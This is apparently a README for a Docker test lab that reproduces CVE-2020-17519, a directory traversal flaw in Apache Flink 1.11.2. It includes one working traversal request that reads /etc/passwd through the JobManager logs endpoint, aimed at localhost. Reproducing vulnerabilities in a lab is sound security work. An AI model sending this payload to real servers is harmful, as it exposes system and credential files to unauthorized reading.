# CVE-2020-17519 Docker Test Environment

This repository provides a minimal Docker Compose setup that reproduces **CVE-2020-17519** using a vulnerable Apache Flink JobManager (version 1.11.2).

## Services
- **db** – MariaDB 10.5 used as a simple backend (optional for other tests).
- **jobmanager** – Apache Flink JobManager running version **1.11.2**. The vulnerable directory‑traversal endpoint is exposed on port **8081**.
- **taskmanager** – Apache Flink TaskManager required for a functional Flink cluster.

## Getting Started
```bash
# From the directory containing docker-compose.yml
docker compose up -d
```
The Flink JobManager UI and REST API will be reachable at `http://localhost:8081`.

### Testing the Vulnerability
You can verify the directory‑traversal issue with a request such as:
```
GET /jobmanager/logs/..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: localhost:8081
```
The response should contain the contents of the targeted file if the vulnerability is present.

## Cleanup
```bash
docker compose down -v
```
